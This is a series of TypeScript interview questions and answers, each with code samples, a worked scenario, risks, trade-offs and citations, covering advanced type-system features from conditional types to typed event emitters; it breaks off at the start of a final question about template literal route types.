**Direct answer:** While both `interface` and `type` can describe object shapes and contracts, they possess fundamental architectural differences in declaration merging, union representation, inheritance syntax, and compiler performance.

```typescript
// 1. Declaration Merging (Interfaces ONLY):
// Two interfaces with the same name in the same scope merge their properties:
interface Window {
    analytics: AnalyticsService;
}
interface Window {
    authToken?: string;
}
// window now has BOTH analytics and authToken!
// A type alias with the same name throws: 'Duplicate identifier Window'.

// 2. Unions, Tuples, and Primitives (Type Aliases ONLY):
type Status = 'pending' | 'success' | 'failed'; // Union cannot be an interface
type Coordinate = [x: number, y: number];       // Tuple cannot be an interface
type StringOrNumber = string | number;

// 3. Inheritance vs Intersection:
interface User extends Person { role: string; }
type UserType = Person & { role: string; };
```

**Compiler Performance and Best Practices:**
- **Interface caching:** The TypeScript compiler caches interface relationships internally by nominal name, making property lookup and subtype checking faster in large codebases.
- **Type intersection costs:** Intersecting multiple type aliases (`A & B & C & D`) creates a flat intersection that must be re-evaluated repeatedly, increasing compilation times.
- **Rule of thumb:** Prefer `interface` for public library APIs and extensible object schemas; use `type` for unions, tuples, primitives, and complex conditional/mapped transformations.

## Why

Interfaces support declaration merging and cached compiler lookup, whereas type aliases model unions and complex type-level algebra.

## Worked Case

Walkthrough scenario: A developer builds a plugin architecture where third-party packages add custom properties to a core Request object. Defining Request as a type alias prevents plugins from extending it without modifying library source files. Defining Request as an interface allows third-party plugins to declare interface Request in their own index.d.ts files, seamlessly merging their custom plugin properties into the global Request contract.

## Risk

Accidental declaration merging with identically named interfaces across different files creates silent schema pollution.

## Trade-off

Interfaces provide faster compiler type-checking but cannot represent union types, tuples, or mapped aliases directly.

## Try This

Declare an interface User twice with distinct fields and instantiate an object requiring both fields to verify declaration merging.

## Follow-ups

### Can an interface extend a union type alias?

No, an interface can only extend statically known object shapes, not a union type (e.g. interface A extends (B | C) is invalid).

## Citations

- https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#differences-between-type-aliases-and-interfaces

# How do distributive conditional types operate over naked type parameters, and how do you suppress distribution using tuples?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In TypeScript, a conditional type `T extends U ? X : Y` is called **distributive** when `T` is an unadorned, 'naked' type parameter. When a union type `A | B` is supplied to a distributive conditional type, the check automatically distributes across each constituent member: `(A extends U ? X : Y) | (B extends U ? X : Y)`.

```typescript
// 1. Distributive Conditional Type (Naked T):
type ToArray<T> = T extends any ? T[] : never;
type Distributed = ToArray<string | number>;
// Evaluates as: ToArray<string> | ToArray<number>
// Result: string[] | number[]

// 2. Non-Distributive Conditional Type (Wrapped [T]):
// Wrapping T in a single-element tuple prevents distribution:
type ToArrayNonDist<T> = [T] extends [any] ? T[] : never;
type NonDistributed = ToArrayNonDist<string | number>;
// Result: (string | number)[]

// 3. Implementing NonNullable via distribution:
type MyNonNullable<T> = T extends null | undefined ? never : T;
type Safe = MyNonNullable<string | null | undefined>; // Result: string (never is pruned from unions)
```

**Suppressing Distribution:**
To prevent distribution and check whether the *entire union as a single entity* satisfies a constraint, wrap both the operand and constraint in a tuple: `[T] extends [U] ? TrueBranch : FalseBranch`. This is mandatory when detecting `never` (since `never` is an empty union and distributes to `never` without evaluating either branch).

## Why

Distributive conditional types allow mapping operations across union members, while tuple wrapping tests unions as a collective whole.

## Worked Case

Walkthrough scenario: A developer builds an API response handler and wants to check if a type parameter T is exactly boolean. In TypeScript, boolean is an alias for the union true | false. When passing boolean to type IsBoolean<T> = T extends boolean ? true : false, naked T distributes over true and false individually, producing true | true which is true. But if testing type IsExactUnion<T> = T extends any ? ... , wrapping [T] in a tuple is mandatory to inspect the combined union rather than its isolated branches.

## Risk

Checking T extends never directly never executes the true branch because never distributes over zero elements.

## Trade-off

Distribution is convenient for filtering (pruning never) but requires counter-intuitive tuple syntax [T] when checking exact equality.

## Try This

Write an IsNever<T> type and verify that [T] extends [never] ? true : false correctly returns true for never while T extends never fails.

## Follow-ups

### Why does type IsNever<T> = T extends never ? true : false evaluate to never when passed never?

never is an empty union of zero types; when a conditional type distributes over zero members, the result is an empty union (never).

## Citations

- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#distributive-conditional-types

# How does the infer keyword enable type extraction in conditional types, and how do you extract tuple heads, tails, and promise values?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `infer` keyword introduces a type variable inside the `extends` clause of a conditional type to be deduced dynamically by the TypeScript compiler. It acts as pattern matching for types: rather than providing a type explicitly, you declare a hole (`infer R`) that the compiler fills with the corresponding matched type.

```typescript
// 1. Recursive Promise Unwrapping (Awaited<T>):
type UnpackPromise<T> = T extends Promise<infer U> ? UnpackPromise<U> : T;
type DeepResolved = UnpackPromise<Promise<Promise<string>>>; // Result: string

// 2. Extracting Function Return Types and Parameters:
type ExtractReturn<T> = T extends (...args: any[]) => infer R ? R : never;
type ExtractParams<T> = T extends (...args: infer P) => any ? P : never;

// 3. Tuple Head and Tail Extraction (Pattern Matching):
type First<T extends any[]> = T extends [infer Head, ...any[]] ? Head : never;
type Rest<T extends any[]> = T extends [any, ...infer Tail] ? Tail : [];

type Names = ['Alice', 'Bob', 'Charlie'];
type F = First<Names>; // 'Alice'
type R = Rest<Names>;  // ['Bob', 'Charlie']
```

**Co-located Inferences:**
- Multiple `infer` declarations in union positions (e.g. arguments of overloaded functions) yield a union type.
- Multiple `infer` declarations in contravariant positions (function parameter positions) yield an intersection type.

## Why

The infer keyword enables type-level pattern matching and recursive metaprogramming without manual hardcoding.

## Worked Case

Walkthrough scenario: A microservice middleware pipeline passes data through a sequence of transformation functions. The developer needs to deduce the final output type of a pipe(f1, f2, f3) call. Using infer with recursive tuple tail extraction unwraps the return type of each function step-by-step, ensuring that the input parameter of f2 matches the output of f1 with strict compile-time verification.

## Risk

Unbounded recursive infer types trigger Type instantiation is excessively deep and possibly infinite compiler errors.

## Trade-off

Enables expressive type extraction at the cost of steep cognitive complexity and slower IDE type-checking performance.

## Try This

Implement a Pop<T extends any[]> utility type using infer that strips the last item from a tuple and returns the remaining elements.

## Follow-ups

### What happens when infer is used multiple times for the same type variable in function parameter positions?

Because function parameters are in contravariant positions, multiple infer candidates for the same variable resolve to an intersection type.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#inferring-within-conditional-types

# How do mapped types with key remapping via the as clause filter and transform object keys dynamically?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Mapped types construct new object types by iterating over keys with `[K in keyof T]`. TypeScript 4.1 introduced **key remapping via the `as` clause**, allowing developers to modify, filter, or replace property names dynamically using template literal types or conditional checks.

```typescript
interface User {
    id: string;
    name: string;
    age: number;
    isAdmin: boolean;
}

// 1. Transforming Key Names with Template Literals (Getters):
type Getters<T> = {
    [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K];
};
type UserGetters = Getters<User>;
// Result: { getId: () => string; getName: () => string; getAge: () => number; getIsAdmin: () => boolean; }

// 2. Filtering Out Keys by Remapping to never:
type PickByValueType<T, TargetValue> = {
    [K in keyof T as T[K] extends TargetValue ? K : never]: T[K];
};
type OnlyStringProps = PickByValueType<User, string>;
// Result: { id: string; name: string; } (age and isAdmin filtered out!)
```

**Mechanics of `never` in Key Remapping:**
When a key in an `as` clause evaluates to `never`, TypeScript completely omits that property from the resulting object type, providing a native and highly performant alternative to legacy `Omit<T, K>` implementations.

## Why

Key remapping via as enables programmatic mutation and filtering of schema property names using type-level string templates.

## Worked Case

Walkthrough scenario: An ORM model contains both database columns (id, title, createdAt) and local helper methods (save, validate). A serializer function needs a type containing only the columns, filtering out any property whose value is a function. Using a mapped type with [K in keyof T as T[K] extends Function ? never : K] strips all methods cleanly, producing a pure data transfer object schema.

## Risk

Remapping symbol keys with template literals that require string can cause unexpected compile errors unless filtered with string & K.

## Trade-off

Provides type-level schema transformation at compile time without requiring runtime reflection or metadata decorators.

## Try This

Write a mapped type that prefixes all methods of an interface with 'rpc_' and transforms return values into Promises.

## Follow-ups

### Why is string & K required when capitalizing keys in template literals?

keyof T can contain number or symbol keys; intersecting with string ensures Capitalize<T> receives only valid string types.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/mapped-types.html#key-remapping-via-as

# How does the satisfies operator (TypeScript 4.9+) preserve narrow literal types while validating structural conformance?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `satisfies` operator (introduced in TypeScript 4.9) solves a classic type system trade-off: validating that an expression matches a defined type contract *without* widening the expression's inferred literal type. Prior to `satisfies`, developers had to choose between type annotations (which widen) and type assertions (which bypass checks).

```typescript
type RGB = [red: number, green: number, blue: number];
type Color = string | RGB;

// Problem 1: Type annotation widens palette values to string | RGB:
const palette1: Record<string, Color> = {
    red: [255, 0, 0],
    green: '#00ff00',
    blue: [0, 0, 255]
};
// palette1.green.toUpperCase(); // Error: Property 'toUpperCase' does not exist on type 'RGB'!

// Problem 2: Type assertion (as) suppresses typos:
const palette2 = { red: [255, 0] } as Record<string, Color>; // Passes unsafely even though [255, 0] is invalid RGB!

// Solution: satisfies checks conformance while preserving exact literal shapes!
const palette3 = {
    red: [255, 0, 0],
    green: '#00ff00',
    blue: [0, 0, 255]
} satisfies Record<string, Color>;

palette3.green.toUpperCase(); // Allowed! TypeScript knows green is string.
palette3.red.slice(0, 2);     // Allowed! TypeScript knows red is [number, number, number].
```

**Comparison Summary:**
- `const x: T`: Validates `T`, but widens inferred type to `T`.
- `const x = val as T`: Unsafely coerces type to `T`, suppressing excess property checks and type mismatches.
- `const x = val satisfies T`: Validates `T` strictly, while retaining the narrow, exact inferred type of `val`.

## Why

satisfies guarantees contract compliance while preserving specific literal property types for autocompletion and method calls.

## Worked Case

Walkthrough scenario: A design token configuration defines colors, paddings, and font sizes. Using a type annotation : ThemeConfig widens theme.colors.primary to string, losing specific hex codes like '#0f172a' and preventing exact CSS color completions in downstream components. Replacing the annotation with satisfies ThemeConfig verifies that all required theme keys are present, while preserving exact literal hex values for autocompletion throughout the application.

## Risk

Assuming satisfies prevents mutation: it checks types but does not freeze objects at runtime like Object.freeze.

## Trade-off

Requires TypeScript 4.9+ and is purely a compile-time assertion with zero emitted JavaScript runtime code.

## Try This

Declare a routes config with satisfies Record<string, RouteInfo> and verify typo detection on routes without losing specific path completions.

## Follow-ups

### Can you combine as const with satisfies?

Yes, const config = { ... } as const satisfies Schema deep-freezes literal types while simultaneously validating schema conformance.

## Citations

- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-9.html#the-satisfies-operator

# How do covariance, contravariance, and invariance apply to function parameters and return types under strictFunctionTypes?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Variance describes how the subtyping relationship of complex types relates to the subtyping relationship of their component types. In TypeScript with `--strictFunctionTypes` enabled, function return types are **covariant**, while function parameter types are **contravariant**.

```
Subtype Relationship: Dog extends Animal (Dog is a subtype of Animal)

1. Covariance (Return Types - Same Direction):
() => Dog is assignable to () => Animal.
A caller expecting an Animal will be completely satisfied receiving a Dog.

2. Contravariance (Parameter Types - Reversed Direction!):
(animal: Animal) => void is assignable to (dog: Dog) => void.
A function that can handle ANY Animal can safely be passed where a function expecting a Dog is required!
Conversely, (dog: Dog) => void CANNOT be passed where (animal: Animal) => void is expected (it might receive a Cat).
```

```typescript
class Animal { name = 'animal'; }
class Dog extends Animal { bark() {} }

type AnimalHandler = (a: Animal) => void;
type DogHandler = (d: Dog) => void;

let handleAnimal: AnimalHandler = (a) => console.log(a.name);
let handleDog: DogHandler = (d) => d.bark();

handleDog = handleAnimal; // Valid under contravariance! handleAnimal can safely process a Dog.
// handleAnimal = handleDog; // Compile error under strictFunctionTypes! handleDog might be called with a Cat.
```

**The Method Bivariance Exception:**
Methods written with method syntax `{ method(x: string): void }` remain **bivariant** for backward compatibility with `Array.prototype.push`. To enforce strict contravariant parameter checking, always declare function signatures as properties: `{ method: (x: string) => void }`.

## Why

Contravariant parameter checking prevents passing functions that expect narrow subtypes to callers providing wider supertypes.

## Worked Case

Walkthrough scenario: A UI library has an event handler callback: onClick: (e: MouseEvent) => void. A developer attempts to pass a custom handler expecting a specialized pointer event: onSpecialClick: (e: PointerEvent) => void. Under strictFunctionTypes, parameter contravariance rejects this assignment with a compiler error, preventing a runtime crash where the caller dispatches a standard MouseEvent lacking PointerEvent properties.

## Risk

Declaring methods as object functions using method shorthand enables bivariance, silently allowing unsound argument assignments.

## Trade-off

Strict contravariance catches runtime type bugs but requires explicit casting when interfacing with older non-strict DOM libraries.

## Try This

Write an EventListener interface using method syntax vs property syntax and observe assignability differences under strictFunctionTypes.

## Follow-ups

### Why did TypeScript deliberately keep method syntax bivariant?

Bivariant methods were preserved so Array<Dog> could be assignable to Array<Animal>, allowing existing JavaScript array idioms to pass.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/functions.html#declaring-this-in-a-function
- https://github.com/microsoft/TypeScript/pull/18654

# How do you implement deep immutable types (DeepReadonly), deep partials (DeepPartial), and deep required types recursively?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Standard TypeScript utility types like `Readonly<T>` and `Partial<T>` are strictly shallow—they only modify the top-level properties of an object. In production state management (Redux, Zustand) and configuration engines, applications require **recursive conditional mapped types** that traverse down nested object hierarchies while leaving primitive leaves and function references intact.

```typescript
// Built-in primitive types that should NOT be recursed into:
type Primitive = string | number | boolean | bigint | symbol | undefined | null | Function;

// 1. Recursive DeepReadonly:
export type DeepReadonly<T> = T extends Primitive
    ? T
    : T extends Map<infer K, infer V>
    ? ReadonlyMap<DeepReadonly<K>, DeepReadonly<V>>
    : T extends Set<infer M>
    ? ReadonlySet<DeepReadonly<M>>
    : T extends Array<infer E>
    ? ReadonlyArray<DeepReadonly<E>>
    : {
        readonly [K in keyof T]: DeepReadonly<T[K]>;
    };

// 2. Recursive DeepPartial:
export type DeepPartial<T> = T extends Primitive
    ? T
    : T extends Array<infer E>
    ? Array<DeepPartial<E>>
    : {
        [K in keyof T]?: DeepPartial<T[K]>;
    };
```

**Recursion Guardrails:**
- Always check for `Primitive` and `Function` first. Recursing into functions breaks their call signatures.
- Special-case built-in objects like `Date`, `RegExp`, `Map`, and `Set` to prevent converting internal methods into broken object structures.
- To prevent compiler recursion crashes on circular types, limit mapping to JSON-serializable structures.

## Why

Deep mapped types enforce immutability and partial patching across arbitrarily deep nested domain structures.

## Worked Case

Walkthrough scenario: A Redux reducer manages a complex state tree with nested user settings. A developer uses Readonly<AppState>, but accidentally writes state.settings.theme.colors.primary = '#000' in a reducer. Because Readonly is shallow, TypeScript permits the mutation, causing silent state mutation bugs. Replacing Readonly with DeepReadonly flags the nested property assignment as an error at compile time.

## Risk

Applying unconstrained recursive mapped types to circular object graphs causes Type instantiation is excessively deep compiler errors.

## Trade-off

Deep recursive types increase compile times and type-checking latency on massive AST or GraphQL schemas.

## Try This

Create a deeply nested state object and verify with DeepReadonly that mutating state.user.address.zip triggers a compile-time error.

## Follow-ups

### How do you implement DeepMutable to strip readonly modifiers recursively?

Use the -readonly mapping modifier in the recursive step: { -readonly [K in keyof T]: DeepMutable<T[K]> }.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/mapped-types.html

# How do const type parameters (TypeScript 5.0+) infer exact literal types directly at function call sites?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Prior to TypeScript 5.0, functions accepting generic arguments widened object and array literals to general types (e.g. `string[]` or `{ name: string }`), forcing callers to explicitly append `as const` at every call site. TypeScript 5.0 introduced **`const` type parameters**, which instruct the compiler to infer the most specific, literal `readonly` type automatically.

```typescript
// Legacy approach (Prior to TS 5.0):
function setNamesLegacy<T extends readonly string[]>(names: T): T {
    return names;
}
// Callers HAD to append 'as const' manually:
const names1 = setNamesLegacy(['alice', 'bob'] as const); // ['alice', 'bob']
const names2 = setNamesLegacy(['alice', 'bob']);          // string[] (Widened!)

// Modern approach with const type parameter (TS 5.0+):
function setNamesModern<const T extends readonly string[]>(names: T): T {
    return names;
}
// Callers pass normal literals, and TypeScript infers the exact readonly tuple!
const namesModern = setNamesModern(['alice', 'bob']);
// Inferred type of namesModern: readonly ['alice', 'bob']!
```

**Route and Configuration Builders:**
`const` type parameters are transformative for API builders, routing tables, and schema definitions. Passing an object literal `createRouter({ routes: ['/users', '/billing'] })` preserves the exact string union `'/users' | '/billing'` without requiring clunky `as const` annotations from consuming developers.

## Why

const type parameters automatically deduce narrow literal types for function arguments without requiring callers to annotate as const.

## Worked Case

Walkthrough scenario: A library author builds a type-safe form builder: createForm({ fields: ['email', 'password'] }). Callers want onSubmit: (data: Record<Fields, string>) => void to know the exact field keys. Without const T, fields widens to string[], and data becomes Record<string, string>. Adding <const T extends readonly string[]> infers readonly ['email', 'password'], giving callers exact autocompletion for data.email and data.password.

## Risk

const type parameters infer readonly tuples; passing them to functions expecting mutable arrays causes type errors.

## Trade-off

Results in readonly immutable structures that prevent subsequent in-place array mutations like push or splice.

## Try This

Write a createEnum<const T extends readonly string[]>(...values: T) helper and verify values are inferred as exact string literals.

## Follow-ups

### What happens if a variable previously defined without const is passed to a const type parameter function?

If an already-widened variable (let x = ['a']) is passed, const T respects the variable's existing type (string[]) without narrowing.

## Citations

- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-5-0.html#const-type-parameters

# How do declaration merging, module augmentation, and global scope expansion extend third-party library types?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript provides three distinct mechanisms to extend external or ambient type definitions without modifying third-party source code in `node_modules`: interface declaration merging, module augmentation (`declare module`), and global scope augmentation (`declare global`).

```typescript
// 1. Module Augmentation: Extending Express Request type
// Inside a custom-types.d.ts file:
import { UserSession } from './auth';

declare module 'express-serve-static-core' {
    interface Request {
        user?: UserSession; // Augment Express Request with authenticated user session
        startTime: number;
    }
}

// 2. Global Scope Augmentation: Adding properties to window or NodeJS environment
declare global {
    namespace NodeJS {
        interface ProcessEnv {
            DATABASE_URL: string;
            JWT_SECRET: string;
            PORT?: string;
        }
    }
    interface Window {
        StripeAnalytics?: (event: string) => void;
    }
}
export {}; // Ensure file is treated as a module
```

**Invariants and Rules:**
- **Module requirement:** Module augmentations must occur inside a file that has top-level `import` or `export` statements. If a file has no imports/exports, it is treated as a script, and `declare module` will replace rather than augment the target module.
- **Interface matching:** You can only augment `interface` definitions; you cannot augment a `type` alias.

## Why

Module and global augmentation allow applications to type custom middleware extensions and runtime globals safely.

## Worked Case

Walkthrough scenario: An authentication middleware decodes a JWT and attaches req.user = decoded to the Express request object. In downstream route handlers, accessing req.user triggers TypeScript errors because Express does not define user on Request. Adding a declare module 'express-serve-static-core' augmentation adds user: UserSession to interface Request, enabling type-safe access across all controllers.

## Risk

Creating a declare module in a file without import/export statements overwrites the entire module with an empty declaration.

## Trade-off

Augmentations are ambient and global to the compilation context; overusing them can obscure true library dependencies.

## Try This

Augment process.env with custom environment variables in a globals.d.ts file and verify autocompletion on process.env.DATABASE_URL.

## Follow-ups

### Why is export {}; necessary at the end of a declaration file containing declare global?

It marks the file as an ES module, ensuring declare global operates as an augmentation rather than a global script scope.

## Citations

- https://www.typescriptlang.org/docs/handbook/declaration-merging.html#module-augmentation

# How do noUncheckedIndexedAccess and exactOptionalPropertyTypes eliminate soundness gaps in production codebases?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** By default, TypeScript contains subtle soundness gaps designed for developer convenience. Enabling `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes` in `tsconfig.json` closes two of the most prevalent runtime bug vectors in production JavaScript systems.

```typescript
// 1. noUncheckedIndexedAccess:
// Default behavior: Record access is assumed present!
const scores: Record<string, number> = { alice: 100 };
// Without flag: scores['bob'] has type number! Runtime returns undefined -> Crash on .toFixed()!
// With noUncheckedIndexedAccess: scores['bob'] has type number | undefined!
const bobScore = scores['bob'];
if (bobScore !== undefined) {
    console.log(bobScore.toFixed(2)); // Safe!
}

// 2. exactOptionalPropertyTypes:
interface UserPreference {
    theme?: 'light' | 'dark'; // Means: property may be absent
}
// Without flag: { theme: undefined } is valid!
// With exactOptionalPropertyTypes: You CANNOT explicitly pass undefined unless declared as 'theme?: 'light' | 'dark' | undefined'!
const pref: UserPreference = {
    // theme: undefined // Compile Error with exactOptionalPropertyTypes!
};
// Critical for Object.assign or JSON.stringify, where 'theme' in pref is true if theme is undefined!
```

**Production Significance:**
In JavaScript, `'key' in obj` and `Object.hasOwn(obj, 'key')` evaluate to `true` even if `obj.key === undefined`. `exactOptionalPropertyTypes` ensures that optional properties represent *missing* keys, preventing subtle configuration bugs.

## Why

These flags enforce truthful dictionary and optional property typing, eliminating undefined-access crashes in production.

## Worked Case

Walkthrough scenario: An application parses CSV headers into a string[] and reads const id = headers[0].toUpperCase(). If the CSV file is empty, headers[0] evaluates to undefined at runtime, causing Cannot read properties of undefined (reading toUpperCase). Enabling noUncheckedIndexedAccess forces headers[0] to be typed as string | undefined, forcing the developer to guard against empty CSVs.

## Risk

Enabling these flags on mature codebases requires extensive refactoring to add nullish checks on array and dictionary lookups.

## Trade-off

Requires explicit undefined checks when reading array elements by index or dictionary keys by string.

## Try This

Enable noUncheckedIndexedAccess in tsconfig.json and observe how accessing array[0] forces a check for undefined before usage.

## Follow-ups

### How do you safely access a guaranteed array element without casting when noUncheckedIndexedAccess is enabled?

Use an explicit non-null assertion array[0]! only when bounds are mathematically proven, or prefer safe array methods like for...of.

## Citations

- https://www.typescriptlang.org/tsconfig#noUncheckedIndexedAccess
- https://www.typescriptlang.org/tsconfig#exactOptionalPropertyTypes

# How do user-defined type predicates (x is T) and assertion functions (asserts x is T) narrow types across conditional branches?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript's control flow analysis can automatically narrow types via `typeof` and `instanceof`, but it cannot inspect custom validation logic inside helper functions without **user-defined type predicates** (`x is T`) or **assertion functions** (`asserts x is T`).

```typescript
interface AdminUser { role: 'admin'; permissions: string[]; }
interface StandardUser { role: 'user'; }
type AppUser = AdminUser | StandardUser;

// 1. Boolean Type Predicate (x is T):
// Returns boolean; if true, TypeScript narrows the variable in the if branch:
function isAdmin(user: AppUser): user is AdminUser {
    return user.role === 'admin' && Array.isArray((user as any).permissions);
}

function handleRequest(user: AppUser) {
    if (isAdmin(user)) {
        console.log(user.permissions); // Narrows to AdminUser!
    }
}

// 2. Assertion Function (asserts x is T):
// Throws on invalid input; if it returns normally, TypeScript narrows downstream code unconditionally:
function assertIsAdmin(user: AppUser): asserts user is AdminUser {
    if (user.role !== 'admin') {
        throw new Error('Unauthorized: Admin access required');
    }
}

function executeSuperuserAction(user: AppUser) {
    assertIsAdmin(user);
    // All code below this line is guaranteed to have AdminUser type!
    console.log(user.permissions.join(', '));
}
```

**Soundness Responsibility:**
The TypeScript compiler does *not* verify that the body of a type predicate actually validates `T`. If you return `true` mistakenly, TypeScript trusts your predicate unconditionally. Write exhaustive property checks inside type guards.

## Why

Type predicates and assertion functions bridge custom runtime validation checks into the compiler's control flow analysis.

## Worked Case

Walkthrough scenario: An array const items = [1, null, 2, undefined, 3]. Calling items.filter(x => x !== null && x !== undefined) produces an array that TypeScript still types as (number | null | undefined)[]. Passing a type predicate function items.filter((x): x is number => x != null) instructs TypeScript to narrow the resulting array to number[], eliminating type errors.

## Risk

Writing an inaccurate type guard (e.g. returning true without checking all fields) causes runtime type pollution without compiler errors.

## Trade-off

Requires authoring and maintaining manual runtime checking code alongside type signatures.

## Try This

Write a isNonNullable<T>(val: T): val is NonNullable<T> predicate and filter an array [1, null, 2] verifying the output is number[].

## Follow-ups

### How do you write an assertion function that asserts a condition rather than a specific type?

Use asserts condition: function assert(condition: unknown, msg: string): asserts condition { if (!condition) throw new Error(msg); }.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/narrowing.html#using-type-predicates
- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-3-7.html#assertion-functions

# How do you type polymorphic React components with an as prop to enforce matching HTML attributes dynamically?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A polymorphic component is a reusable component that can render as different HTML elements or React components via an `as` prop (e.g. `<Button as="button">` vs `<Button as="a" href="...">`), while guaranteeing that HTML attributes and refs dynamically adapt to the selected element.

```tsx
import React, { ElementType, ComponentPropsWithRef, ReactNode } from 'react';

// 1. Omit duplicate props to prevent collisions between component props and HTML props:
type MergeProps<E extends ElementType, P = {}> = P & Omit<ComponentPropsWithRef<E>, keyof P>;

// 2. Polymorphic props definition:
type BoxProps<E extends ElementType = 'div'> = {
    as?: E;
    children?: ReactNode;
} & MergeProps<E>;

// 3. Polymorphic Component Implementation:
export function Box<E extends ElementType = 'div'>({ as, children, ...rest }: BoxProps<E>) {
    const Component = as || 'div';
    return <Component {...rest}>{children}</Component>;
}

// USAGE VALIDATION:
// Valid: href is allowed on 'a' tag
const link = <Box as="a" href="https://example.com">Visit</Box>;

// Compile Error: href is NOT allowed on 'button' element!
// const bad = <Box as="button" href="https://example.com">Click</Box>;
```

**Why `ComponentPropsWithRef` matters:**
Using `ComponentPropsWithRef<E>` ensures that passing `ref` to `<Box as="button" ref={btnRef}>` correctly infers `HTMLButtonElement`, while `<Box as="a" ref={aRef}>` infers `HTMLAnchorElement`.

## Why

Polymorphic typing ensures accessibility and design system flexibility without sacrificing strict HTML attribute safety.

## Worked Case

Walkthrough scenario: A design system provides a primary Button component styled as a pill. The navigation bar needs a link that looks like a Button but renders semantically as an HTML anchor tag for SEO and keyboard navigation. Using a polymorphic Button as='a' href='/login' renders a native anchor tag with full button styling while TypeScript guarantees href, target, and rel props are strictly checked.

## Risk

Failing to Omit conflicting component prop names from HTML attributes causes type intersection conflicts.

## Trade-off

Polymorphic generic types are complex to author and require careful ref forwarding configurations.

## Try This

Instantiate Box with as='button' and pass href; observe TypeScript red squiggly error indicating href is invalid on button.

## Follow-ups

### How do you wrap a polymorphic component with React.forwardRef?

ForwardRef requires a type assertion or helper function because forwardRef does not natively support generic component signatures.

## Citations

- https://react.dev/learn/typescript#typing-dom-events
- https://www.typescriptlang.org/docs/handbook/2/generics.html

# How do you implement a strongly-typed Event Emitter and Pub/Sub bus with custom event-to-payload maps in TypeScript?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A strongly-typed Event Emitter maps event names to their exact payload signatures, guaranteeing that listeners receive correct argument types and that callers cannot emit unregistered events or invalid payloads.

```typescript
// 1. Declare event-to-payload interface map:
export interface AppEventMap {
    'user:login': { userId: string; timestamp: number };
    'user:logout': { userId: string };
    'theme:change': { theme: 'light' | 'dark' };
    'session:expired': void; // Events with no payload
}

// 2. Generic Typed EventEmitter Implementation:
export class TypedEventEmitter<Events extends Record<string, any>> {
    private listeners = new Map<keyof Events, Set<(payload: any) => void>>();

    on<E extends keyof Events>(event: E, handler: (payload: Events[E]) => void): () => void {
        if (!this.listeners.has(event)) this.listeners.set(event, new Set());
        this.listeners.get(event)!.add(handler);
        return () => this.off(event, handler);
    }

    off<E extends keyof Events>(event: E, handler: (payload: Events[E]) => void): void {
        this.listeners.get(event)?.delete(handler);
    }

    emit<E extends keyof Events>(event: E, ...args: Events[E] extends void ? [] : [payload: Events[E]]): void {
        const payload = args[0];
        this.listeners.get(event)?.forEach(fn => fn(payload));
    }
}

// USAGE VALIDATION:
const bus = new TypedEventEmitter<AppEventMap>();
bus.on('user:login', ({ userId, timestamp }) => console.log(userId)); // Fully typed payload!
bus.emit('user:login', { userId: 'usr_1', timestamp: Date.now() });   // Strictly checked payload!
bus.emit('session:expired'); // No payload required for void events!
```

**Variadic Args for Void Events:**
Using conditional tuple arguments `...args: Events[E] extends void ? [] : [payload: Events[E]]` allows events mapped to `void` to be emitted without passing dummy arguments, while payload events require their exact object shape.

## Why

Typed event buses replace loose string-based message passing with compile-time checked event-payload contracts.

## Worked Case

Walkthrough scenario: A micro-frontend messaging bus allows decoupled widgets to communicate. Without TypeScript event maps, Widget A emits 'USER_LOGOUT' with { id: '1' } while Widget B listens for 'user_logout' expecting { userId: '1' }. The typo and property mismatch cause silent notification failures. A shared TypedEventEmitter<AppEvents> flags the event name mismatch and property inconsistency at build time.

## Risk

Failing to remove listeners using the returned unsubscribe callback creates long-lived memory leaks.

## Trade-off

Requires centralized maintenance of the event map interface across distributed micro-frontend packages.

## Try This

Add an event with a boolean payload to AppEventMap and verify that calling bus.emit with a number produces a compile error.

## Follow-ups

### How do you support once listeners that auto-remove after a single trigger?

Wrap the handler in an internal callback that calls off before invoking the original handler.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/generics.html
- https://nodejs.org/api/events.html

# How do template literal types enable type-safe URL route parameter extraction and path validation?

<!-- meta
answer_format: conceptual
